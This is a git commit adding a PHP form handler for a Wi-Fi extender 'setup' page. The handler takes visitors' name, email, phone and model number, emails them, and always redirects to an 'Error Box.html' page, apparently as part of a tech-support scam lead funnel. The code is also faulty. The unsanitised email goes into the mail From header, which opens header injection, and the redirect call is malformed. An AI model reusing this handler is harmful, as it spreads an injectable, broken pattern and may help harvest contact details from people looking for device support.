29873b7fffed02130b3fd70c6e676b952fa2a72d
wifiextset <110332326+wifiextset@users.noreply.github.com>
2023-08-12 13:30:13 +0530

    Add files via upload

---
+++ process_form.php
@@ -0,0 +1,23 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $full_name = $_POST["full_name"];
+    $email = $_POST["email"];
+    $phone = $_POST["phone"];
+    $model_number = $_POST["model_number"];
+    
+    $to = "specified@example.com"; // Replace with your email address
+    $subject = "Extension Setup Form Submission";
+    $message = "Full Name: $full_name\n";
+    $message .= "Email: $email\n";
+    $message .= "Phone: $phone\n";
+    $message .= "Model Number: $model_number\n";
+    $headers = "From: $email";
+
+    mail($to, $subject, $message, $headers);
+    
+    header("Error Box.html"); // Redirect to Error Box.html
+    exit();
+} else {
+    echo "Error: Invalid request.";
+}
+?>
